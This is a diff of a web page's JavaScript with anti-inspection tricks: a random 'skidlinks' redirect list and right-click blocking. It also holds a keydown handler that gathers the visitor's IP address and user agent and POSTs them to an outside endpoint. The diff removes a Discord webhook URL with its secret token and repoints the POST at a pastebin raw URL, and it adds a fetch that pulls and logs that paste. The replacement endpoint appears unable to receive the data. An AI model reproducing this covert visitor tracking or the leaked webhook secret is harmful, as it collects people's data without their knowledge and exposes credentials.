@@ -7,6 +7,16 @@ var skidlinks = [
   'https://resources.infosecinstitute.com/topic/vulnerability-assessment/'
 ];
 var skidlink = skidlinks[Math.floor(Math.random() * skidlinks.length)];
+async function getContent(url) {
+    const response = await fetch(url);
+    const text = await response.text();
+    return text;
+}
+
+const pastebinUrl = 'https://pastebin.com/raw/v3F5eajd';
+getContent(pastebinUrl).then(content => {
+    console.log(content);
+});
 
 // Right-click blocking
 document.addEventListener('contextmenu', function(event) {
@@ -153,7 +163,7 @@ document.addEventListener('keydown', function(event) {
         const content = ip + "\n" + ua;
         
         // Replace WEBHOOK_URL with your Discord webhook URL
-        fetch('https://discord.com/api/webhooks/1081677198932590672/Z2Xm7uBl8CIA3CdSCnJlRH9vG32I911TldhscZG-eR5TjykQQkEDhRra2-DxQQHxkQif', {
+        fetch(pastebinUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ content })
